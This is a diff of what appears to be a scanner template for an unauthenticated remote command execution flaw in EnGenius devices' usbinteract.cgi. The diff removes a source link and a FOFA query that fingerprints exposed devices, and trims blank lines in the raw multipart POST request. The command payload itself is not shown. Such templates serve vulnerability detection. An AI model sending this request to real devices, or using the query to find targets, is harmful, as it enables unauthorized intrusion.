@@ -3,12 +3,8 @@ info:
   name: EnGenius  usbinteract.cgi 存在未授权远程命令执行
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sfftcgh3qy0uduvk'
+  description: ''
   tags: rce,unauth,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sfftcgh3qy0uduvk
-    fofa: body="/web/images/guest.png" && body="/web/images/admin.png"
 http:
 - raw:
   - 'POST /web/cgi-bin/usbinteract.cgi HTTP/1.1
@@ -50,17 +46,14 @@ http:
     Content-Disposition: form-data; name="NewFileText"
 
 
-
     ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
 
     Content-Disposition: form-data; name="NewFolderText"
 
 
-
     ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
 
     Content-Disposition: form-data; name="setRootTxt"
-
 
 
     ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37--'
